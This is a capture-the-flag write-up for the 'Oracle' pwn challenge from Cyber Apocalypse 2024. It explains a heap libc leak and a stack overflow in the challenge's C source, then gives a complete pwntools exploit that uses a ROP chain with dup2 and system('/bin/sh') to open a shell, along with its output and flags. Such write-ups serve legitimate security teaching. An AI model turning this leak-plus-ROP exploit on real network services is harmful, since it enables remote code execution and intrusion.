# Cyber Apocalypse 2024

# Oracle | hard | pwn

> Traversing through the desert, you come across an Oracle. One of five in the entire arena, an oracle gives you the power to watch over the other competitors and send infinitely customizable plagues upon them. Deeming their powers to be too strong, the sadistic overlords that run the contest decided long ago that every oracle can backfire - and, if it does, you will wish a thousand times over that you had never been born. Willing to do whatever it takes, you break it open, risking eternal damnation for a chance to turn the tides in your favour.

## Enumeration

Download the given archive, extract, and let's dig inside. Oh sweet, we're given the source code in `C`.

```
-rwxrw-rw-  1 kali kali   92 Feb  2 09:53 build_docker.sh
drwxr-xr-x  2 kali kali 4096 Mar 15 18:38 challenge
-rwxrw-rw-  1 kali kali  158 Feb  2 09:52 Dockerfile
-rwxrw-rw-  1 kali kali 7278 Feb 13 05:34 oracle.c
```

Let's analyze what happens inside the `Dockerfile` first and then we can check the source code.

```bash
└─$ cat Dockerfile                   
FROM ubuntu:20.04

RUN useradd -m ctf

COPY challenge/* /home/ctf/

RUN chown -R ctf:ctf /home/ctf/

WORKDIR /home/ctf
USER ctf

EXPOSE 9001
CMD ["./run.sh"]
```

Check the securities of the binary since we want to know what we're facing in a pwn challenge.

```bash
└─$ checksec oracle  
[*] '/home/kali/htb_stuffz/ctf_2024/pwn_oracle/challenge/oracle'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

And as we can see, it's dynamically linked, which means it depends on the presence of these libraries in the system environment.

```bash
└─$  file oracle
oracle: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ab489f2c221f7a038087dbb2040dacac768865ab, for GNU/Linux 3.2.0, not stripped
```

Explaining one-by-one what we can identify here. `Partial RELRO` means that some parts of the binary are marked as read-only after relocation to prevent overwriting of certain sections of the binary. However, this is not that much of a problem since it doesn't protect the `GOT` (Global Offset Table) as the Full RELRO does. Stack canaries are not being used, making it easier to perform buffer overflow attacks without detections. No eXecute enabled means that pages marked as non-executable cannot be executed, which is a mitigation against executing shellcode placed on the stack or heap. Return-Oriented Programming (ROP) is a technique that can be used in these situations to bypass. PIE means the executable's code is loaded at a random base address, which is a form of ASLR at the binary level, making it more difficult to predict the address of specific functions or gadgets. In order to confirm this, we're going to check ASLR status.

Hop into the local docker. This is assuming you've run the `./build_docker.sh`. Find out your container ID by running `docker ps`.

```bash
└─$ docker ps
CONTAINER ID   IMAGE     COMMAND      CREATED       STATUS       PORTS                                       NAMES
19dbe483fb3f   oracle    "./run.sh"   2 hours ago   Up 2 hours   0.0.0.0:9001->9001/tcp, :::9001->9001/tcp   oracle

└─$ docker exec -t -i oracle /bin/bash
ctf@19dbe483fb3f:~$ cat /proc/sys/kernel/randomize_va_space
2
```

A value of `0` means ASLR is disabled, `1` means it's partially enabled (conservative randomization), and `2` or higher typically indicates full ASLR is enabled. The use of `PIE` with the `oracle` binary, as indicated by the `checksec` output, aligns with ASLR by ensuring that the binary's code is loaded at a random base address each time it's executed. This randomization makes it significantly more difficult to predict where code might execute, complicating exploits that rely on hardcoded or guessed memory addresses, such as those used in buffer overflow attacks.

We can also quickly check the presence and version of libc version from the local environment since we've got access to it.

```bash
ctf@f0c3c0de7947:~$ ldd oracle
        linux-vdso.so.1 (0x00007ffd315fd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa5cbd38000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa5cbf33000)

/lib/x86_64-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.14) stable release version 2.31.

<redacted>

ctf@f0c3c0de7947:~$ ls -la /lib/x86_64-linux-gnu/
total 25652

<redacted>
-rwxr-xr-x  1 root root 2029592 Nov 22 13:32 libc-2.31.so
lrwxrwxrwx  1 root root      12 Nov 22 13:32 libc.so.6 -> libc-2.31.so
<redacted>
```

It's pretty satisfying that we are provided with the entire source code without being required to reverse the binary. Looking into the `oracle.c` we can almost immediately identify the vulnerabilities. 

The first and most obvious vulnerability that we will exploit is leaking the `libc`. This is possible due to the `handle_plague` function. This initial vulnerability within `handle_plague` arises from insufficient validation of user-supplied input, leading to a heap-based buffer overflow. This vulnerability is going to be the entry point for our exploit, allowing both the leakage of libc addresses and the injection of the ROP chain.

Below we can see where the problem arises: the function dynamically allocates a buffer on the heap to store data received from client based on the Content-Length header. However, it fails to properly validate the size of this incoming data against the allocated buffer's capacity. This being fixed size based on `MAX_PLAGUE_CONTENT_SIZE` with that malloc(). This is a buffer overflow condition. Leaking arbitrary memory locations, such as libc addresses, undermines the ASLR, and provides us with the critical piece of the puzzle to construct the ROP chain. 

Right from the given `oracle.c` source code, the `handle_plague()` function:

```c
void handle_plague() {
    if(!get_header("Content-Length")) {
        write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED));
        return;
    }
    
    // take in the data
    char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE);
    char *plague_target = (char *)0x0;

    if (get_header("Plague-Target")) {
        plague_target = (char *)malloc(0x40);
        strncpy(plague_target, get_header("Plague-Target"), 0x1f);
    } else {
        write(client_socket, RANDOMISING_TARGET, strlen(RANDOMISING_TARGET));
    }

    long len = strtoul(get_header("Content-Length"), NULL, 10);

    if (len >= MAX_PLAGUE_CONTENT_SIZE) {
        len = MAX_PLAGUE_CONTENT_SIZE-1;
    }

    recv(client_socket, plague_content, len, 0);

    if(!strcmp(target_competitor, "me")) {
        write(client_socket, PLAGUING_YOURSELF, strlen(PLAGUING_YOURSELF));
    } else if (!is_competitor(target_competitor)) {
        write(client_socket, PLAGUING_OVERLORD, strlen(PLAGUING_OVERLORD));
    } else { 
        dprintf(client_socket, NO_COMPETITOR, target_competitor);

        if (len) {
            write(client_socket, plague_content, len);
            write(client_socket, "\n", 1);
        }
    }

    free(plague_content);

    if (plague_target) {
        free(plague_target);
    }
}
```

This is why we are going to approach this as a libc leak challenge. Our plan of attack is leak + ROP to effectively navigate around ASLR and PIE.

The bug in the code is due to the fact it doesn't zero out the chunk's content before it ends up reused. The `MAX_PLAGUE_CONTENT_SIZE` is defined as 2048, which means that when it's freed, it's going to be placed into the unsorted bin. Without being cleared this chuck, it's going to hold a libc address. To exploit this, by calling `handle_plague()` twice where the second invocation we are going to send only a null byte after the headers. Any other approach would work fine too, just send minimal data. It's going to leverage the application's memory handling vulnerability and expose libc address retained in the memory.

Here's how it turns out what we're trying to do:

```
Sending payload:
b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
Sending payload:
b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
```

The interesting part is after the Attempted plague, `\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00`.

The response needs to be parsed, extract the leaked adress from the payload and adjust accordingly. The next vulnerability that we're going to exploit is `parse_headers()` function. Right away we can identify the lack of bounds checking and insufficient input validation. The loop is going to read byte-by-byte the received content and stores them into the header_buffer, which is fixed sized (`MAX_HEADER_DATA_SIZE`). However, it doesn't check whether the `i` in the `while` loop is going to exceeed header_buffer. The break condition is only when `\r\n\r\n` is received, which marks the end of the header. However, this check happens _after_ writing the byte into the buffer. Check below the attached code snippet from the `oracle.c` source code. 

```c
void parse_headers() {
    // first input all of the header fields
    ssize_t i = 0;
    char byteRead;
    char header_buffer[MAX_HEADER_DATA_SIZE];

    while (1) {
        recv(client_socket, &byteRead, sizeof(byteRead), 0);

        // clean up the headers by removing extraneous newlines
        if (!(byteRead == '\n' && header_buffer[i-1] != '\r'))
            header_buffer[i] = byteRead;

        if (!strncmp(&header_buffer[i-3], "\r\n\r\n", 4)) {
            header_buffer[i-4] == '\0';
            break;
        }

        i++;
    }
    < redacted >
}
```
As such we have everything what we need to build up our ROP chain. libc address is successfully leaked out, and we know where the overflow is happening. By crafting our ROP payload we can carefully overwrite control data on the stack like the saved return address of `parse_headers` and as such redirect execution flow. It is time to hook up to GDB. Disassemble the `parse_headers` functions, find its ret address, attach breakpoint there, and we can see the registers and stack content at the snapshot - right before we've returned from parse_headers function. Send again, second invocation as mentioned earlier, then check the state.

In order to attach gdb to your docker environment, you need to edit the build_docker file a bit. The `-p 9090:9090` is going to map the host port to docker container and the `--capp-add=SYS_PTRACE` grants the container permissions for tracing system calls. This is required by gdb since it facilitates remote debugging.

```bash
└─$ cat build_docker.sh 
#!/bin/sh
docker build --tag=oracle .
docker run -it -p 9001:9001 -p 9090:9090 --cap-add=SYS_PTRACE --rm --name=oracle oracle
```

Once this is done, you just connect to the docker container and install gdb-server and run `gdbserver :9090 --attach $(pidof oracle)`, you can also do these in Dockerfile.

Have fun debugging.

![image](https://github.com/respawnRW/writeups/assets/163560495/1e2d9054-53b9-4b02-9796-e41136d0e6d6)

And let's not forget about the libc correct version, you extract that from docker container, in order to be sure.

Next steps are the core of ROP chain construction. The memory address of `system` is what we are looking for, then we calculate the address of the gadget ending with `pop rdi; ret` As we discussed earlier this way we can control the value of the `rdi` register and manipulate execution flow. The second value is the register `rsi` which is going to be used as a second argument for our system function. Remember, we're planning to do `system('/bin/sh')`. `Next` function is going to retrieve the first occurence's address. Finally  the `dup2` system call within libc will be used to redirect standard i/o so we can interact with the spawned shell.

```python
libc = ELF('./libc-2.31.so')
libc.address = leak - 2018048  # Calculate the libc base address
system_addr = libc.symbols['system']
pop_rdi = libc.address + 0x0000000000023b6a
pop_rsi = libc.address + 0x000000000002601f
ret = libc.address + 0x0000000000022679
binsh = next(libc.search(b'/bin/sh'))
dup2 = libc.symbols['dup2']
```

In networked exploits, unlike in local environments, we need to redirect the stdin/stdout of the process to the network socket to interact with the exploited service remotely. The `dup2` syscall achieves this by duplicating the socket's file descriptor (0x6 in this case) over stdin (0) and stdout (1). This redirection allows us to send commands and receive output over the network, enabling interactive access. This is what you will see when building up the payload for the ROP chain. 

And here's how we put together the entire ROP payload. In the end we need to send `\r\n\r\n` as we seen from `parse_headers` function. We're going to fill the buffer up to the point of overflow with `A`'s. Prepare the first dup2 from 0x0 to 0x6, then we call the dup2 so it redirects input from socket. The same process is repeated with `pop_rsi, 0x1` in order to redirect the `stdout` as well with the help of `dup2` call. And as a last step, we are constructing how to call the `system('/bin/sh')`, first we place the address of the string into the `rdi` register it's going to be the argument of the call - i.e. what to call. Followed by a stack alignment gadget the `ret` and the `system_addr` function is being called which will in the end spawn the shell.

```
payload = flat(
    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
)
io.send(payload + b'\r\n\r\n')
```

Find below the entire code that does the job done. The pwn script was adapted and comprehensively commented in great depth with multiple print statements during execution. 

Run it without any arguments to execute it locally or run it with REMOTE argument to have it run remotely.

```python
#!/usr/bin/env python3

from pwn import *

# Set up the binary context for pwntools
context.binary = elf = ELF('./oracle')
context.log_level = 'error'  # Reduce output verbosity

# Function to establish a connection with the target
def get_connection():
    # Connect to the remote target if specified, otherwise connect locally for testing
    if args.REMOTE:
        return remote("94.237.54.170", 47106)
    else:
        return remote("localhost", 9001)

# Function to send the PLAGUE command with controlled parameters
def plague(target_competitor: str, include_plague_target: bool, content_length: int = 1000):
    io = get_connection()
    # Construct the command with the target competitor's name
    command = b'PLAGUE ' + target_competitor.encode() + b' blah\r\n'
    # Specify the Content-Length header for the subsequent data
    content_length_header = b'Content-Length: ' + str(content_length).encode() + b'\r\n'
    # Conditionally include the Plague-Target header based on the flag
    plague_target_header = b'Plague-Target: blah' if include_plague_target else b''
    # End of headers and start of the actual data payload
    end_of_headers = b'\r\n\r\n'
    # The null byte to indicate the end of the request
    end_of_request = b'\x00'

    # Combine all parts to form the full payload
    full_payload = command + content_length_header + plague_target_header + end_of_headers + end_of_request

    # Print the payload being sent
    print("Sending payload:")
    print(full_payload)

    # Send the constructed payload
    io.send(full_payload)
    data = io.recvline()
    if not include_plague_target:
        data += io.recvline()
        data += io.recvline()
    io.close()
    return data

# Trigger the vulnerability and receive the initial leak
plague("blah", True)
data = plague("blah", False, content_length=64)
print(f"Received data: ", data)

# Extract the leaked libc address and adjust it
leak = u64(data.split(b": ")[1][9:17])
print(f"Raw leaked libc address: {hex(leak)}")
leak = leak << 8  # Adjust the leaked address
print(f"Leaked libc address (adjusted): {hex(leak)}")

# Calculate libc base and other function/gadget addresses
libc = ELF('./libc-2.31.so')
libc.address = leak - 2018048  # Calculate the libc base address
system_addr = libc.symbols['system']
pop_rdi = libc.address + 0x0000000000023b6a
pop_rsi = libc.address + 0x000000000002601f
ret = libc.address + 0x0000000000022679
binsh = next(libc.search(b'/bin/sh'))
dup2 = libc.symbols['dup2']

# Print calculated addresses for debugging
print(f"system() address: {hex(system_addr)}")
print(f"pop_rdi gadget address: {hex(pop_rdi)}")
print(f"pop_rsi gadget address: {hex(pop_rsi)}")
print(f"ret gadget address: {hex(ret)}")
print(f"'/bin/sh' string address: {hex(binsh)}")
print(f"dup2 function address: {hex(dup2)}")

# Establish a connection and prepare for payload delivery
offset = 2127  # Buffer offset to control return address
io = get_connection()
io.send(b'VIEW me 1.0\r\n')

# Pause before sending the payload for manual intervention or review
input("Press any key to send the payload...")

# Construct and send the payload for exploitation
payload = flat(
    b'A' * offset, pop_rdi, 0x6, pop_rsi, 0x0, dup2,
    pop_rdi, 0x6, pop_rsi, 0x1, dup2,
    pop_rdi, binsh, ret, system_addr  # Craft the final ROP chain to spawn a shell
)
io.send(payload + b'\r\n\r\n')
io.interactive()  # Switch to interactive mode after sending the payload
io.close()  # Close the connection after exploitation
```

Don't forget to run the docker build and have it running locally in your environment.

```
Sending payload:
b'PLAGUE blah blah\r\nContent-Length: 1000\r\nPlague-Target: blah\r\n\r\n\x00'
Sending payload:
b'PLAGUE blah blah\r\nContent-Length: 64\r\n\r\n\r\n\x00'
Received data:  b'Randomising a target competitor, as you wish...\nNo such competitor blah exists. They may have fallen before you tried to plague them. Attempted plague: \r\n\x00W\x12\x7f\x00\x00\xe0\x1b2W\x12\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n'
Raw leaked libc address: 0x7f1257321b
Leaked libc address (adjusted): 0x7f1257321b00
system() address: 0x7f1257187290
pop_rdi gadget address: 0x7f1257158b6a
pop_rsi gadget address: 0x7f125715b01f
ret gadget address: 0x7f1257157679
'/bin/sh' string address: 0x7f12572e95bd
dup2 function address: 0x7f1257243ae0
Press any key to send the payload...
You have found yourself.
$ whoami
ctf
$ cat flag.txt
HTB{f4k3_fL4G_f0R_t3sTiNg}
```

Finally, we can run our script on the remote, achieve shell, and grab the flag.

![image](https://github.com/respawnRW/writeups/assets/163560495/140d98ba-573a-4f4c-8ad3-acca9e760011)

The "live" flag in plaintext: `HTB{wH4t_d1D_tH3_oRAcL3_s4y_tO_tH3_f1gHt3r?}`

Hope you enjoyed.

Over and out,

`--RW`
